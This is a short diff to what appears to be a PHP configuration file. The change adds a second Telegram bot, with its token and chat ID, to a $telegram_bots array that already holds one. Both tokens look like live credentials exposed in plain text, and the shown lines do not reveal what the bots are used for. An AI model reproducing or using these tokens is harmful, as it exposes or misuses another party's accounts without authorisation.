@@ -10,10 +10,10 @@ $telegram_bots = [
         'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
         'chat_id' => '1325797388'
     ],
-    // [
-    //     'token' => 'your_second_bot_token',
-    //     'chat_id' => 'your_second_chat_id'
-    // ]
+    [
+        'token' => '7635810313:AAEDfJcy11V0VdcAp_q07BKr2g7lj_nneNI',
+        'chat_id' => '8160582785'
+    ]
     // Add more bots here if needed
 ];
 
